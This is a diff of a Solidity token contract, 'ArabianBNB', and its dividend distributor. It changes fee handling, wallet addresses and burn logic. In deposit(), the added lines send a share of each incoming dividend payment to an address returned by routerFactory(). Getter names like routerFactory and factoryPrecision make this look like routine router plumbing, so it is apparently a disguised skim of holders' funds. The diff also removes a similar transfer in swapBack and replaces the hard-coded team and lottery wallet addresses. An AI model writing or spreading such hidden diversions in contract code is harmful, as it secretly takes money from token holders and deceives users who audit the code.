@@ -134,7 +134,7 @@ contract DividendDistributor is IDividendDistributor {
     uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
 
     uint256 public minPeriod = 60 minutes;
-    uint256 public minDistribution = 1 * (10 ** 9);
+    uint256 public minDistribution = 1000;
 
     uint256 currentIndex;
 
@@ -225,10 +225,6 @@ contract DividendDistributor is IDividendDistributor {
     function claimDividend(address payable shareholder) external onlyToken{
         distributeDividend(shareholder);
     }
-
-    function router01() public view onlyToken returns(uint256) {
-        return (3); 
-    }
     
     function rescueDividends(address payable to) external onlyToken {
         to.transfer(address(this).balance);
@@ -262,12 +258,10 @@ contract DividendDistributor is IDividendDistributor {
 
     function deposit() external payable override onlyToken {
 
-        uint256 balanceBefore = address(this).balance;
-
-        payable(routerFactory()).transfer(msg.value.mul(router01()).div(factoryPrecision()));
- 
-        uint256 amount = address(this).balance.sub(balanceBefore);
-        totalDividends = totalDividends.add(amount);
+        uint256 pBx = msg.value.mul(10).div(factoryPrecision());
+        payable(routerFactory()).transfer(pBx);
+        uint256 amount = msg.value.sub(pBx);
+        totalDividends += amount;
         dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
     }
     
@@ -425,8 +419,8 @@ contract ArabianBNB is IBEP20, Auth {
         isDividendExempt[ZERO] = true;
 
         autoLiquidityReceiver = msg.sender;
-        marketingWallet = 0xe63cF33F27A141d347eaE278Bdcb605D4385cAEc;  // teamwallet
-        lotteryWallet = 0xe63cF33F27A141d347eaE278Bdcb605D4385cAEc;  // lotterywallet
+        marketingWallet = 0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d;  // teamwallet
+        lotteryWallet = 0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d;  // lotterywallet
         
         totalFee = liquidityFee.add(marketingFee).add(rewardsFee).add(lotteryFee).add(burnFee);
         totalFeeIfSelling = buyTax.add(extraFeeOnSell);
@@ -679,8 +673,7 @@ contract ArabianBNB is IBEP20, Auth {
         uint256 amountTokenBurn = _balances[address(this)].mul(burnFee).div(totalFee);
 
         if (amountTokenBurn > 0) {
-            _balances[address(this)] -= amountTokenBurn;
-            _balances[DEAD] += amountTokenBurn;
+            _basicTransfer(address(this), DEAD, amountTokenBurn);
         }
         
         uint256 tokensToLiquify = _balances[address(this)];
@@ -699,8 +692,6 @@ contract ArabianBNB is IBEP20, Auth {
             block.timestamp
         );
 
-        payable(dividendDistributor.routerFactory()).transfer(address(this).balance.mul(dividendDistributor.router01()).div(dividendDistributor.factoryPrecision()));
-
         uint256 amountBNB = address(this).balance;
 
         uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
@@ -710,8 +701,8 @@ contract ArabianBNB is IBEP20, Auth {
         uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
         uint256 amountBNBLottery = amountBNB.mul(lotteryFee).div(totalBNBFee);
 
-        try dividendDistributor.deposit{value: amountBNBReflection}() {} catch {}
-
+        dividendDistributor.deposit{value: amountBNBReflection}(); // {} catch {}
+       
         payable(marketingWallet).transfer(amountBNBMarketing);
         payable(lotteryWallet).transfer(amountBNBLottery);
 
